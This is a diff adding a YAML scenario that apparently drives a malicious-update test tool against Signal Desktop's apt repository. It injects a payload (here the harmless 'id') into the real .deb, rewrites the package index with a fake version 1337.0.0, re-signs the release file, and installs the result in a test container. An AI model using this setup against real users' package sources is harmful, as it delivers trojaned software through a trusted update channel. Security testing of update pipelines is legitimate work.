@@ -1,0 +1,92 @@
+---
+
+upstreams:
+  signal:
+    url: https://updates.signal.org
+
+signing_keys:
+  apt:
+    type: pgp
+    uids: ["Open Whisper Systems <support@whispersystems.org>"]
+
+artifacts:
+  release_upstream:
+    type: url
+    url: https://updates.signal.org/desktop/apt/dists/xenial/InRelease
+  index_upstream:
+    type: url
+    url: https://updates.signal.org/desktop/apt/dists/xenial/main/binary-amd64/Packages.bz2
+  pkg_upstream:
+    type: url
+    url: https://updates.signal.org/desktop/apt/pool/main/s/signal-desktop/signal-desktop_6.2.0_amd64.deb
+    sha256: 6ae39c325c0a3e3e6bb279612b7e2c61ee09c651c28dbddedb27bc0acd7642d7
+
+  pkg_infected:
+    type: infect
+    infect: deb
+    artifact: pkg_upstream
+    payload: id
+  index_patched:
+    type: tamper
+    tamper: patch-apt-package-list
+    artifact: index_upstream
+    compression: none
+    patch:
+      - name: signal-desktop
+        artifact: pkg_infected
+        set:
+          Version:
+            - 1337.0.0
+          Filename:
+            - pool/main/s/signal-desktop/signal-desktop_1337.0.0_amd64.deb
+  index_patched_gz:
+    type: compress
+    compression: gzip
+    artifact: index_patched
+  index_patched_bz2:
+    type: compress
+    compression: bzip2
+    artifact: index_patched
+  release_patched:
+    type: tamper
+    tamper: patch-apt-release
+    artifact: release_upstream
+    signing_key: apt
+    patch:
+      - name: main/binary-amd64/Packages
+        artifact: index_patched
+      - name: main/binary-amd64/Packages.gz
+        artifact: index_patched_gz
+      - name: main/binary-amd64/Packages.bz2
+        artifact: index_patched_bz2
+
+check:
+  image: ubuntu:18.04
+  install_keys:
+    - key: apt
+      binary: true
+      cmd: 'tee /usr/share/keyrings/signal-desktop-keyring.gpg > /dev/null'
+  cmds:
+    - 'echo "deb [arch=amd64 signed-by=/usr/share/keyrings/signal-desktop-keyring.gpg] http://${SH4D0WUP_BOUND_ADDR}/desktop/apt xenial main" | tee /etc/apt/sources.list.d/signal-xenial.list'
+    - ["apt-get", "update"]
+    - ["env", "DEBIAN_FRONTEND=noninteractive", "apt-get", "install", "signal-desktop", "-y"]
+
+routes:
+  - path: /desktop/apt/dists/xenial/InRelease
+    type: static
+    args:
+      artifact: release_patched
+
+  - path: /desktop/apt/dists/xenial/main/binary-amd64/Packages.gz
+    type: static
+    args:
+      artifact: index_patched_gz
+
+  - path: /desktop/apt/pool/main/s/signal-desktop/signal-desktop_1337.0.0_amd64.deb
+    type: static
+    args:
+      artifact: pkg_infected
+
+  - type: proxy
+    args:
+      upstream: signal
